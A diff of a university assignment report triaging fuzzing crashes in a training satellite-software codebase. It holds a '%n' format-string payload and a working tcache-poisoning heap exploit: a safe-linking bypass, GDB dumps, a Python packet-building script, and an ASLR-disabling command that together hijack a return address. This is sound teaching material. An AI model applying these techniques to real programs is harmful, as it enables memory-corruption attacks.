+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==1767==ABORTING
+```
+
+**Exploitability Assessment:**
+
+The stack buffer overflow vulnerability can impact the confidentiality, integrity, and availability of the system. Successful exploitation enables execution of arbitrary code by reading or writing to the stack as well as denial of service by crashing. According to CWE, CWE-121 Stack-Based Buffer Overflow has a high likelihood of exploitation. Due to the lack of user input validation, an attacker can easily supply a string value for `label_buffer` that exceeds the 64-byte buffer. Based on the NIST guidelines, the overall security impact of this vulnerability is considered high.
+
+---
+
+#### 4.2.10 `sentinel_payload` Vulnerability 4
+
+| Field                  | Details |
+| :--------------------- | :------ |
+| Vulnerability Name     | Stack Buffer Underflow, Format String Vulnerability |
+| CWE Classification     | CWE-124: Buffer Underwrite ('Buffer Underflow'), CWE-134: Use of Externally-Controlled Format String |
+| Target Component       | `sentinel_payload.c` |
+| Vulnerable Location    | `fprintf()`, line 35, `fprintf(stderr, error_description);` |
+| Reproducing Input File | `sentinel_payload/out/msan/crashes/id\:000001\,sig\:11\,src\:000004\,time\:27\,execs\:135\,op\:havoc\,rep\:7` |
+
+**Triggering Input & Reproduction Command:**
+
+```
+PAPLPAPLPAPLPAPLPAYL%nPAYL%nPAYL%nPAYL%n
+```
+
+```bash
+./sentinel_payload_msan crash_analysis/stack-buffer-underflow01.bin
+```
+
+**Root Cause Analysis:**
+
+The header line, `PAPLPAPLPAPLPAPLPAYL%nPAYL%nPAYL%nPAYL%n`, is parsed by the `sscanf()` function as follows:
+
+| Variable       | Value |
+| :------------- | :---- |
+| `width`        | Uninitilised. |
+| `height`       | Uninitilised. |
+| `depth`        | Uninitilised. |
+| `label_buffer` | Uninitilised. |
+
+The `sscanf()` function returns `0`, causing the `if sscanf(header_line, "PAYLOAD_FRAME %u %u %u %127s", &width, &height, &depth, label_buffer) != 4;` condition to evaluate as `true`. As a result, `log_payload_error()` is called with `header_line` as an argument. As `header_line` contains the `%n` format specifier, the function attempts to write the number of preceding characters printed so far to an invalid or unintended memory address. This triggers the format string vulnerability and leads to memory corruption.
+
+**GDB / Sanitiser Evidence:**
+
+```bash
+rachel@RCHL-LTPX1:~/ifn657_assignment_2/sentinel_payload$ ./sentinel_payload_msan crash_analysis/stack-buffer-underflow01.bin
+=== Sentinel-1 Scientific Payload Ingestion Subsystem ===
+[PAYLOAD ERROR] MemorySanitizer:DEADLYSIGNAL
+==1748==ERROR: MemorySanitizer: SEGV on unknown address 0xffffffffffffffff (pc 0x7ffff7c6fb72 bp 0x7fffffffd7f0 sp 0x7fffffffd2d0 T1748)
+==1748==The signal is caused by a WRITE memory access.
+    #0 0x7ffff7c6fb72 in __printf_buffer stdio-common/vfprintf-process-arg.c:356:21
+    #1 0x7ffff7c709e7 in __vfprintf_internal stdio-common/vfprintf-internal.c:1548:7
+    #2 0x5555555d26b1 in vfprintf (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_msan+0x7e6b1) (BuildId: e7008cc86b4aa2cac4f6f45407f52722a1969360)
+    #3 0x5555555d3831 in fprintf (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_msan+0x7f831) (BuildId: e7008cc86b4aa2cac4f6f45407f52722a1969360)
+    #4 0x5555555883d3 in log_payload_error /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:35:5
+    #5 0x5555556263b8 in parse_payload_file /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c
+    #6 0x5555556264a9 in old_main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:148:18
+    #7 0x5555556267cc in main /home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload.c:160:15
+    #8 0x7ffff7c2a600 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:59:16
+    #9 0x7ffff7c2a717 in __libc_start_main csu/../csu/libc-start.c:360:3
+    #10 0x5555555884c4 in _start (/home/rachel/ifn657_assignment_2/sentinel_payload/sentinel_payload_msan+0x344c4) (BuildId: e7008cc86b4aa2cac4f6f45407f52722a1969360)
+
+==1748==Register values:
+rax = 0x0000000000000014  rbx = 0x00007fffffffd830  rcx = 0x0000000000000000  rdx = 0x0000000000000014
+rdi = 0x0000000000000000  rsi = 0x00007ffff7dd4360  rbp = 0x00007fffffffd7f0  rsp = 0x00007fffffffd2d0
+ r8 = 0x0000000000000000   r9 = 0x0000000000000000  r10 = 0x00000000ffffffff  r11 = 0x0000000000000000
+r12 = 0x0000000000000000  r13 = 0x0000000000000000  r14 = 0xffffffffffffffff  r15 = 0x00007fffffffdb95
+MemorySanitizer can not provide additional info.
+SUMMARY: MemorySanitizer: SEGV stdio-common/vfprintf-process-arg.c:356:21 in __printf_buffer
+==1748==ABORTING
+```
+
+**Exploitability Assessment:**
+
+The stack buffer underflow and format string vulnerabilities can impact the confidentiality, integrity, and availability of the system. Successful exploitation of these vulnerabilities enables execution of arbitrary code by reading and writing to the stack as well as denial of service by crashing. According to CWE, CWE-124 Buffer Underwrite ('Buffer Underflow') has a medium likelihood while CWE-134 Use of Externally-Controlled String has a high likelihood. Due to the lack of user input validation, an attacker can easily and reliably exploit both vulnerabilities by supplying a payload with an invalid header line format and which also includes format specifiers, such as `%x` or `%n`, to read and write to the stack. Based on the NIST guidelines, the overall security impact of this vulnerability is considered high.
+
+---
+
 #### 4.2.11 Vulnerability 11
 | Field | Details |
 | :--- | :--- |
@@ -678,7 +1131,7 @@ The `calculate_telecommand_payload_size()` function contains a logic flaw. The p
 ```
 
 **Exploitability Assessment:**
-`[Assess the severity and realistic attacker impact]`
+The exploitability of this vulnerability is limited to denial of service. The integer underflow causes `memcpy` to copy approximately 4 GB of data into a 1024-byte buffer, so the write inevitably runs past the end of the heap into unmapped (or read-only) memory. This immediately terminates the program with a segmentation fault. Because an attacker cannot control the length of the write, the program crashes before any corrupted heap metadata or adjacent chunks are used, making this unsuitable for further exploitation.
 
 ---
 
@@ -715,14 +1168,14 @@ WRITE of size 12 at 0xe5e00754 thread T0
 ```
 
 **Exploitability Assessment:**
-`[Assess the severity and realistic attacker impact]`
+This vulnerability is considerably more exploitable than Vulnerability 12. Unlike the previous overflow, it overwrites only 8 bytes past the allocated buffer, so the program does not crash immediately. Since these 8 bytes are fully attacker-controlled, they can corrupt the header metadata of the next heap chunk, which can lead to various attack paths. Nevertheless, heap protection mechanisms and ASLR make reliable exploitation more difficult.
 
 ---
 
 #### 4.2.14 Vulnerability 14
 | Field | Details |
 | :--- | :--- |
-| **Vulnerability Name** | `Heap Use After Free in Active Telecommands` |
+| **Vulnerability Name** | `Heap Use After Free and Double Free in Active Telecommands` |
 | **CWE Classification** | `CWE-416: Use After Free` + `CWE-415: Double Free` |
 | **Target Component** | `sentinel_network.c]` |
 | **Vulnerable Location** | `emergency_command_cleanup()` L81-84 (root cause) → `release_telecommand_record()` L73 (crash site): `if (msg->buffer) {` |
@@ -764,7 +1217,7 @@ READ of size 4 at 0xe5c00790 thread T0
 ```
 
 **Exploitability Assessment:**
-`[Assess the severity and realistic attacker impact]`
+ Although UAF and double-free vulnerabilities are significantly difficult to exploit owing to heap protection mechanisms and ASLR, they can lead to critical memory corruption once those measures are bypassed. For example, if a double-free places the same chunk onto the free list twice, the attacker can reclaim it with `malloc` and overwrite its forward pointer (the link to the next free chunk) with an attacker-chosen address. A subsequent `malloc` then returns that address, and the following `memcpy` injects attacker-controlled data into it.
 
 ---
 
@@ -772,7 +1225,7 @@ READ of size 4 at 0xe5c00790 thread T0
 | Field | Details |
 | :--- | :--- |
 | **Vulnerability Name** | `Misaligned Packet Header Access on Unaligned Stream Offset` |
-| **CWE Classification** | `CWE-1319: Improper Protection against Unaligned Access` |
+| **CWE Classification** | `CWE-758: Reliance on Undefined, Unspecified, or Implementation-Defined Behavior` |
 | **Target Component** | `sentinel_network.c` |
 | **Vulnerable Location** | `validate_packet_integrity()` L94 (crash site): `if (pkt->magic != PROTOCOL_MAGIC_HEADER) {` |
 | **Reproducing Input File** | `crash_analysis/illegal-instruction01.bin` |
@@ -803,7 +1256,7 @@ Program received signal SIGILL, Illegal instruction.
 ```
 
 **Exploitability Assessment:**
-`[Assess the severity and realistic attacker impact]`
+The impact is limited to denial of service. This is undefined behavior (a misaligned access) rather than a flaw that lets an attacker control what is read from or written to memory. A normal build does not crash, but the UBSan build traps the misaligned access and terminates with SIGILL.
 
 ---
 
@@ -853,7 +1306,7 @@ Using `pkt->length` directly (it already excludes the header) removes the subtra
 payload_size = pkt->length;
 ```
 **Technical Justification:**
-Using `pkt->length` directly makes the allocated buffer size match the copied data size, removing the 4-byte heap overflow.
+Using `pkt->length` directly makes the allocated buffer size match the copied data size, removing the 8-byte heap overflow.
 
 #### Patch for Vulnerability 14 (`sentinel_network.c`):
 ```c
@@ -1016,34 +1469,225 @@ afl-fuzz -i seeds -o findings/remediated -x dict ./sentinel_network_remediated @
 ## 6. Task 5: Proof-of-Concept Exploitation
 
 ### 6.1 Target Vulnerability & Security Consequence
-*[Specify which critical vulnerability was chosen for exploitation. Describe the intended actionable security consequence beyond a simple crash (e.g. arbitrary memory write, stack leak, control flow hijacking, or state flag overwrite).]*
 
-- **Target Component:** `[e.g. sentinel_telemetry.c / sentinel_payload.c / sentinel_network.c]`
-- **Vulnerability Selected:** `[e.g. Format String Arbitrary Write / Stack Buffer Overflow Hijack]`
-- **Actionable Exploit Consequence:** `[Describe the tangible exploit objective achieved]`
+- **Target Component:** `sentinel_payload.c`
+    - **Vulnerability Selected:** `[e.g. Format String Arbitrary Write / Stack Buffer Overflow Hijack]`
+    - **Actionable Exploit Consequence:** `[Describe the tangible exploit objective achieved]`
+- **Target Component:** `sentinel_network.c`
+    - **Vulnerability Selected:** `Vulnerability 13: Logical Flaw in Payload Size Calculation Leading to Heap Buffer Overflow`
+    - **Actionable Exploit Consequence:** `control flow hijacking`
 
 ### 6.2 Memory Layout & Address Analysis
-*[Detail the memory state, stack/heap frame layout, resolved target addresses, GDB memory dumps, and endianness considerations.]*
+
+#### sentinel_payload
 
 `[Complete this section with stack/memory diagrams and GDB address resolution steps]`
 
-### 6.3 Complete Exploit Script
-*[Provide your full, working Python exploit script or shell payload generator.]*
+#### sentinel_network
 
+The `sentinel_network.c` handler contains two heap buffer overflow vulnerabilities. Vulnerability 12 writes almost 4 GB of data into a 1024-byte buffer, which almost certainly corrupts unmapped (or read-only) memory and crashes the program, so it does not lead to further exploitation. Vulnerability 13, by contrast, writes only 8 bytes beyond the buffer requested for a type-2 packet; this does not trigger an immediate crash and can overwrite the forward pointer (fd) of an adjacent chunk. We therefore focus on Vulnerability 13.
+
+glibc keeps freed chunks in more than one kind of bin. One is the unsorted bin, a doubly-linked list. Its fd/bk pointers are subject to glibc integrity checks, so it is harder to exploit. The tcache is a LIFO, singly-linked, size-segregated free list used for small chunks. When a chunk is freed into the tcache, its first 4 bytes become the forward pointer and the next 4 bytes become the key used for double-free detection. A newly freed chunk is inserted at the head of its list, and its fd points to the chunk that was previously at the head. When a subsequent malloc requests a size present in a tcache list, a chunk is popped from the head of that list. If we can tamper with the fd of an entry, then once that entry is popped the list's new head becomes the forged address, so the next allocation of that size returns a pointer into an attacker-chosen memory region. Because Vulnerability 13 lets us reach an adjacent chunk's fd, we target the tcache.
+
+Using Vulnerability 13, the tcache can be corrupted as follows. 
+
+The input file contains seven packets in total:
+- packet1: type=2, length=0x3c
+- packet2: type=2, length=0x2c
+- packet3: type=2, length=0xc
+- packet4: type=3 (frees every packet)
+- packet5: type=2, length=0x44
+- packet6: type=2, length=0x2c
+- packet7: type=2, length=0x10
+
+packet1–packet3 push their packet data (msg + buffer) onto the heap in order. Their lengths are chosen to end in 0xc. Due to the payload-size-calculation flaw the buffer is malloc'd for `length − 8` (ending in 0x4), but `memcpy` copies the full length. Because glibc adds the 4-byte size field of the next adjacent chunk and aligns to 16, the usable region ends up exactly 8 bytes larger than the requested size, and that extra space absorbs the 8-byte over-copy. So for packet1–packet3 the overflow stays within each chunk and does not corrupt adjacent chunks.
+```bash
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 2, Length: 60, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxV4
+Thruster calibration telecommand processed successfully.
+
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 2, Length: 12, Magic: 0x12345678, Data: CCCCCCCCCCCCxV4
+Thruster calibration telecommand processed successfully.
+
+(gdb) x/48xw 0x5655b570
+0x5655b570:     0x5655b580      0x00000034      0x00000001      0x00000041   # packet1 msg(0xc)
+0x5655b580:     0x41414141      0x41414141      0x41414141      0x41414141   # packet1 buffer(0x3c)
+0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011
+0x5655b5c0:     0x5655b5d0      0x00000024      0x00000001      0x00000031   # packet2 msg(0xc)
+0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet2 buffer(0x2c)
+0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011   
+0x5655b600:     0x5655b610      0x00000004      0x00000001      0x00000011   # packet3 msg(0xc)  
+0x5655b610:     0x43434343      0x43434343      0x43434343      0x000209e9   # packet3 buffer(0xc)
+0x5655b620:     0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+packet4 frees all six chunks from packet1–packet3 (3 × (msg + buffer)) and inserts them into the tcache lists. Because tcache lists are segregated by chunk size, the result is:
+- tcache(0x10): packet3 msg -> packet3 buffer -> packet2 msg -> packet1 msg
+- tcache(0x30): packet2 buffer
+- tcache(0x40): packet1 buffer
+```bash
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 3, Length: 0, Magic: 0x12345678, Data: xV4
+Emergency station failover executed.
+
+(gdb) x/48xw 0x5655b570
+0x5655b570:     0x0005655b      0xc1d09a22      0x00000001      0x00000041   # packet1 msg    | fd=NULL (0x10 bin tail),   key=0xc1d09a22
+0x5655b580:     0x0005655b      0xc1d09a22      0x41414141      0x41414141   # packet1 buffer | fd=NULL (0x40 bin only),   key=0xc1d09a22
+0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011
+0x5655b5c0:     0x5650d02b      0xc1d09a22      0x00000001      0x00000031   # packet2 msg    | fd -> packet1 msg,         key=0xc1d09a22
+0x5655b5d0:     0x0005655b      0xc1d09a22      0x42424242      0x42424242   # packet2 buffer | fd=NULL (0x30 bin only),   key=0xc1d09a22
+0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
+0x5655b600:     0x5650d34b      0xc1d09a22      0x00000001      0x00000011   # packet3 msg    | fd -> packet3 buffer       key=0xc1d09a22
+0x5655b610:     0x5650d09b      0xc1d09a22      0x43434343      0x000001d1   # packet3 buffer | fd -> packet2 msg,         key=0xc1d09a22
+0x5655b620:     0x0010000c      0x000f000f      0x00100010      0x00100010
+```
+
+Next, packet5 (type=2, length=0x44) is added:
+- its msg record is taken from tcache(0x10)
+- its buffer is taken from tcache(0x40)
+
+The reused buffer chunk has 60 usable bytes, but length=0x44 copies 68 bytes, so the write runs 8 bytes past the chunk and overwrites the size field (left as 0x11) and the forward pointer of the adjacent freed packet2 msg chunk. We set that fd to an address near the saved return address of `dispatch_telecommand`'s stack frame. 
+
+The target address is `0xffffced0`. Under safe-linking, glibc does not store the fd directly but as `ptr ^ (pos >> 12)`, where `ptr` is the target and `pos` is the address of the fd slot. Here the slot sits at `0x5655b5c0`, so `pos >> 12` is `0x5655b`, and the value we write is `0xffffced0 ^ 0x5655b = 0xfffaab8b`. When the chunk is popped, malloc applies the same XOR again, which cancels out and returns `0xffffced0`.
+```bash
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 2, Length: 68, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thruster calibration telecommand processed successfully.
+
+(gdb) x/48xw 0x5655b570
+0x5655b570:     0x0005655b      0xc1d09a22      0x00000001      0x00000041
+0x5655b580:     0x41414141      0x41414141      0x41414141      0x41414141   # packet5 buffer (reused packet1 buffer)
+0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011   # <== overflow: packet2 msg size
+0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xffffced0 ^ 0x5655b = 0xfffaab8b)
+0x5655b5d0:     0x0005655b      0xc1d09a22      0x42424242      0x42424242
+0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
+0x5655b600:     0x5655b580      0x0000003c      0x00000001      0x00000011   # packet5 msg (reused packet3 msg)
+0x5655b610:     0x5650d09b      0xc1d09a22      0x43434343      0x000001d1
+0x5655b620:     0x0010000d      0x0010000f      0x00100010      0x00100010
+```
+
+Next, packet6 (type=2, length=0x2c) is added:
+- its msg record is taken from tcache(0x10)
+- its buffer is taken from tcache(0x30)
+```bash
+(gdb) continue
+Continuing.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+
+(gdb) x/48xw 0x5655b570
+0x5655b570:     0x0005655b      0xc1d09a22      0x00000001      0x00000041
+0x5655b580:     0x41414141      0x41414141      0x41414141      0x41414141   # packet5 buffer (reused packet1 buffer)
+0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011   # <== overflow: packet2 msg size
+0x5655b5c0:     0xfffaab8b      0xc1d09a22      0x00000001      0x00000031   # <== overflow: packet2 msg fd (0xffffced0 ^ 0x5655b = 0xfffaab8b)
+0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet6 buffer (reused packet2 buffer)
+0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
+0x5655b600:     0x5655b580      0x0000003c      0x00000001      0x00000011   # packet5 msg (reused packet3 msg)
+0x5655b610:     0x5655b5d0      0x00000024      0x00000001      0x000001d1   # packet6 msg (reused packet3 buffer)
+0x5655b620:     0x0010000e      0x00100010      0x00100010      0x00100010
+```
+
+Finally, packet7 (type=2, length=0x10) is added:
+- its msg record is taken from tcache(0x10)
+- its buffer is taken from tcache(0x10)
+
+After packet2 msg is popped from tcache(0x10) for the msg allocation, the list's new head becomes the forged address `0xffffced0`. The buffer is the same size class (0x10), so the next allocation pops `0xffffced0`, and the packet data is written starting at that address. The packet writes 12 bytes of padding followed by the 4-byte address of `exit`, so the `exit` address lands exactly on the saved return address in `dispatch_telecommand`'s stack frame. When the function returns, control jumps to `exit` and the program terminates.
+```bash
+(gdb) ni
+[NETWORK LOG] Command Type: 2, Length: 16, Magic: 0x12345678, Data: CCCCCCCCCCCC�
+Thruster calibration telecommand processed successfully.
+
+(gdb) x/48xw 0x5655b570
+0x5655b570:     0x0005655b      0xc1d09a22      0x00000001      0x00000041
+0x5655b580:     0x41414141      0x41414141      0x41414141      0x41414141   # packet5 buffer (reused packet1 buffer)
+0x5655b590:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0x5655b5b0:     0x41414141      0x41414141      0x41414141      0x00000011
+0x5655b5c0:     0xffffced0      0x00000008      0x00000001      0x00000031   # packet7 msg (reused packet2 msg): buffer=0xffffced0 (forged addr)
+0x5655b5d0:     0x42424242      0x42424242      0x42424242      0x42424242   # packet6 buffer (reused packet2 buffer)
+0x5655b5e0:     0x42424242      0x42424242      0x42424242      0x42424242
+0x5655b5f0:     0x42424242      0x42424242      0x42424242      0x00000011
+0x5655b600:     0x5655b580      0x0000003c      0x00000001      0x00000011   # packet5 msg (reused packet3 msg)
+0x5655b610:     0x5655b5d0      0x00000024      0x00000001      0x000001d1   # packet6 msg (reused packet3 buffer)
+0x5655b620:     0x00100010      0x00100010      0x00100010      0x00100010
+
+(gdb) x/4xw 0xffffced0
+0xffffced0:     0x43434343      0x43434343      0x43434343      0xf7db22b0   # saved return address of dispatch_telecommand overwritten with address of exit
+```
+
+### 6.3 Complete Exploit Script
+
+#### sentinel_payload
+```python
+
+```
+
+#### sentinel_network
 ```python
 #!/usr/bin/env python3
-"""
-IFN657 Assignment 2: Proof-of-Concept Exploit Script
-Target: [Target component name]
-Security Consequence: [Actionable consequence description]
-"""
+import struct
+import os
 
-# Insert complete Python exploit script here
+MAGIC = 0x12345678
+
+def build_packet(ptype: int, data: bytes) -> bytes:
+    length = len(data)
+    header = struct.pack("<IHH", MAGIC, ptype, length)
+    return header + data
+
+def main() -> None:
+    packets = b""
+    packets += build_packet(2, b"A" * 0x3c)
+    packets += build_packet(2, b"B" * 0x2c)
+    packets += build_packet(2, b"C" * 0xc)
+    packets += build_packet(3, b"")
+    # safe-linking: fd = target ^ (fd_addr >> 12)
+    RET_SLOT = 0xffffced0        # saved eip - 0xc
+    FD_ADDR  = 0x5655b000        # poisoned fd page
+    fd_mangled = RET_SLOT ^ (FD_ADDR >> 12)
+    packets += build_packet(2, b"A" * 0x3c + struct.pack("<I", 0x11) + struct.pack("<I", fd_mangled))
+    packets += build_packet(2, b"B" * 0x2c)
+    # overwrite saved eip via RET_SLOT chunk
+    pad = b"C" * 12
+    ret_addr = struct.pack("<I", 0xf7db22b0)   # exit
+    packets += build_packet(2, pad + ret_addr)
+
+    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                            "exploit.bin")
+    with open(out_path, "wb") as f:
+        f.write(packets)
+
+    print(f"[+] wrote {len(packets)} bytes to {out_path}")
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### 6.4 Reproduction Instructions & Live Bash Evidence
-*[Provide step-by-step commands to compile and execute your exploit in standard bash, accompanied by terminal output proving successful exploitation.]*
 
+#### sentinel_payload
 ```bash
 # Commands to execute the exploit
 # For example, `python3 exploit.py > exploit_payload.bin` then `./target_binary exploit_payload.bin`
@@ -1052,4 +1696,36 @@ Security Consequence: [Actionable consequence description]
 **Observed Terminal Output & Verification:**
 ```text
 [Paste terminal output proving successful exploit execution]
+```
+
+#### sentinel_network
+```bash
+python3 exploits/exploit.py
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+./sentinel_network_original exploits/exploit.bin
+```
+
+**Observed Terminal Output & Verification:**
+```text
+# ./sentinel_network_original exploits/exploit.bin
+=== Sentinel-1 RF Telecommand Stream Handler ===
+Ingesting packet frame (300 bytes received)...
+[NETWORK LOG] Command Type: 2, Length: 60, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 12, Magic: 0x12345678, Data: CCCCCCCCCCCCxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 3, Length: 0, Magic: 0x12345678, Data: xV4
+Emergency station failover executed.
+[NETWORK LOG] Command Type: 2, Length: 68, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 16, Magic: 0x12345678, Data: CCCCCCCCCCCC�"��
+Thruster calibration telecommand processed successfully.
+
+# echo $?
+24
+# -> 24, not 0 (normal main return) nor a crash code (134/139): the saved return address was hijacked to exit(), so control never returned to main.
 ```
